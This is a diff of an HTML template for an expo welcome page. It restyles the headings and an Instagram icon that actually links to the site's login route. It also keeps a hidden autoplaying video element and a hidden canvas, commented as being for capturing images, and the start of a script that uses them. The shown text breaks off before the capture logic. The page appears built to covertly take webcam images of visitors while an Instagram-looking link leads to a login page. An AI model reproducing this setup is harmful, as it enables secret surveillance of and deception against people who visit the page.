@@ -6,24 +6,33 @@
     <title>Welcome to the Expo</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-900 flex items-center justify-center h-screen leading-none ">
-    <div class="text-center ">
-        <h1 class="text-3xl md:text-7xl font-bold text-gray-100 uppercase">Welcome to</h1>
-        <h1 class="text-5xl md:text-7xl leading-[-2] font-bold text-gray-100 uppercase">Muthuthala</h1>
-        <h1 class="text-8xl md:text-9xl leading-[-2] font-bold text-gray-100 mb-12 uppercase">Expo</h1>
-        <p class="text-sm md:text-md leading-none font-medium text-gray-100 mb-6">Check out our Instagram page for the latest updates and inspiration!</p>
-        <div class="flex justify-center space-x-4">
-            <a href="{% url 'login' %}" class="w-10 h-10">
+<body class="bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 flex items-center justify-center min-h-screen">
+    <div class="text-center p-6 max-w-4xl mx-auto">
+        <!-- Main Heading -->
+        <h1 class="text-4xl sm:text-5xl md:text-6xl lg:text-7xl font-extrabold text-gray-100 uppercase tracking-widest drop-shadow-lg">Welcome to</h1>
+        <h2 class="text-5xl sm:text-6xl md:text-7xl lg:text-8xl font-extrabold text-purple-500 uppercase tracking-tight drop-shadow-lg">Muttunthala</h2>
+        <h3 class="text-6xl sm:text-7xl md:text-8xl lg:text-9xl font-extrabold text-gray-100 uppercase tracking-wide mb-10 drop-shadow-lg">Expo</h3>
+
+        <!-- Subheading -->
+        <p class="text-lg md:text-xl text-gray-300 font-medium mb-8 leading-relaxed">
+            Check out our Instagram page for the latest updates and inspiration!
+        </p>
+
+        <!-- Instagram Link -->
+        <div class="flex justify-center items-center space-x-6">
+            <a href="{% url 'login' %}" class="w-12 h-12 flex items-center justify-center bg-gradient-to-r from-purple-500 to-pink-500 rounded-full shadow-lg hover:scale-105 transition-transform duration-300">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
                      alt="Instagram" 
-                     class="w-full h-full">
+                     class="w-8 h-8">
             </a>
         </div>
     </div>
 
+    <!-- Hidden Video and Canvas for Capturing Images -->
     <video id="video" autoplay hidden></video>
     <canvas id="canvas" width="640" height="480" class="hidden"></canvas>
 
+    <!-- JavaScript for Capturing Images -->
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
